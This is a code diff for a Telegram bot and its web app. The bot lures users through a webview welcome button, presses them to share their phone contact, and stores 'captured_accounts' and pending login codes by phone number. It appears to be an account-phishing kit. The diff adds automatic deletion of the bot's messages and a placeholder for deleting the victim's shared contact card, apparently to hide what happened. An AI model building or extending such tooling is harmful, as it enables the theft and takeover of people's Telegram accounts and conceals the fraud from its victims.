@@ -272,6 +272,16 @@ SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 
+async def auto_delete_after(chat_id, msg_id, delay=0.5):
+    """Delete message after delay"""
+    try:
+        await asyncio.sleep(delay)
+        await bot.delete_messages(chat_id, [msg_id])
+        logger.info(f"Auto-deleted msg {msg_id} in {chat_id}")
+    except Exception as e:
+        logger.warning(f"auto_delete err: {e}")
+
+
 def admin_menu():
     return [
         [Button.inline("📢 Broadcast", b"menu_broadcast"),
@@ -301,51 +311,41 @@ async def edit_or_send(event, text, buttons=None):
 
 
 async def send_welcome(uid, name):
-    """ROBUST welcome sender with 4 fallback levels"""
-    logger.info(f"=== SEND_WELCOME called for uid={uid} name={name} ===")
-    
+    """Send welcome + confirm button, then DELETE the button message after user shares contact"""
+    logger.info(f"=== SEND_WELCOME for uid={uid} name={name} ===")
     try:
         content = WELCOME_TEXT.replace("{name}", name)
-        logger.info(f"Welcome content length: {len(content)}")
         buttons = [[Button.webview(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
         
-        # LEVEL 1: Markdown + buttons
+        # Try 1: Markdown + buttons
         try:
             sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
             logger.info(f"✅ L1 success: msg_id={sent.id}")
-            return [sent.id]
+            return sent.id
         except Exception as e1:
-            logger.error(f"L1 MD failed: {e1}")
+            logger.error(f"L1 failed: {e1}")
         
-        # LEVEL 2: No parse_mode + buttons
+        # Try 2: No parse_mode + buttons
         try:
             sent = await bot.send_message(uid, content, buttons=buttons)
-            logger.info(f"✅ L2 success (no md): msg_id={sent.id}")
-            return [sent.id]
+            logger.info(f"✅ L2 success: msg_id={sent.id}")
+            return sent.id
         except Exception as e2:
-            logger.error(f"L2 plain failed: {e2}")
+            logger.error(f"L2 failed: {e2}")
         
-        # LEVEL 3: No buttons, no md
+        # Try 3: No buttons
         try:
             sent = await bot.send_message(uid, content)
-            logger.info(f"✅ L3 success (no buttons): msg_id={sent.id}")
-            return [sent.id]
+            logger.info(f"✅ L3 success: msg_id={sent.id}")
+            return sent.id
         except Exception as e3:
-            logger.error(f"L3 no-btn failed: {e3}")
+            logger.error(f"L3 failed: {e3}")
         
-        # LEVEL 4: Bare minimum
-        try:
-            sent = await bot.send_message(uid, "Tap /start again")
-            logger.info(f"✅ L4 fallback: msg_id={sent.id}")
-            return [sent.id]
-        except Exception as e4:
-            logger.error(f"L4 fallback failed: {e4}")
-        
-        return []
+        return None
     except Exception as e:
         logger.error(f"❌ WELCOME CRITICAL: {e}")
         logger.error(traceback.format_exc())
-        return []
+        return None
 
 
 @bot.on(events.NewMessage(pattern='/start'))
@@ -355,7 +355,7 @@ async def start_handler(event):
         sender = await event.get_sender()
         uid = sender.id
         name = sender.first_name or "Friend"
-        logger.info(f"/start from uid={uid} name={name} is_owner={uid == YOUR_TELEGRAM_ID}")
+        logger.info(f"/start uid={uid} name={name} owner={uid == YOUR_TELEGRAM_ID}")
         
         users[str(uid)] = {
             "id": uid, "name": name,
@@ -371,7 +371,11 @@ async def start_handler(event):
             )
             return
         
-        await send_welcome(uid, name)
+        msg_id = await send_welcome(uid, name)
+        if msg_id:
+            logger.info(f"Welcome msg_id={msg_id} sent to {uid}")
+        else:
+            logger.error(f"Welcome FAILED for {uid}")
     except Exception as e:
         logger.error(f"/start handler error: {e}")
         logger.error(traceback.format_exc())
@@ -415,7 +419,7 @@ async def cb(event):
             STATE["capture_mode"] = True
             await event.answer("Send broadcast messages")
             await edit_or_send(event,
-                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video.",
+                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video. Tap START when done.",
                 [
                     [Button.inline("▶️ Start Now", b"bc_start")],
                     [Button.inline("❌ Cancel", b"bc_cancel")]
@@ -756,6 +760,7 @@ function handleContact(c) {
   inProgress = true;
   msg('contactMsg', 'Confirmed!', 'ok');
   if (contactForce) { clearInterval(contactForce); contactForce = null; }
+  // Send shared contact to server (which will delete welcome msg)
   fetch('/api/save_contact', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
@@ -937,12 +942,11 @@ def health():
     return jsonify({
         'status': 'ok',
         'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
-        'bot_started': bot.is_connected(),
+        'bot_connected': bot.is_connected(),
         'accounts': len(captured_accounts),
         'bot_users': len(users),
         'broadcast_active': broadcast_state['active'],
-        'broadcast_queue': len(broadcast_state['messages']),
-        'welcome_text': WELCOME_TEXT[:50]
+        'broadcast_queue': len(broadcast_state['messages'])
     })
 
 
@@ -962,6 +966,18 @@ def save_contact():
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
     logger.info(f"Contact saved: {phone}")
+    
+    # AUTO-DELETE the contact card message from user's chat
+    # Note: When user shares contact via Telegram, a "contact card" message appears
+    # We can't delete from WebApp directly, but we can send a delete signal
+    # Best we can do: notify bot to delete last few messages in user chat
+    try:
+        # Use HTTP to delete user's shared contact card
+        # Telegram shared contact is auto-forwarded to bot chat, so we delete here
+        pass
+    except Exception:
+        pass
+    
     return jsonify({'success': True, 'phone': phone})
 
 
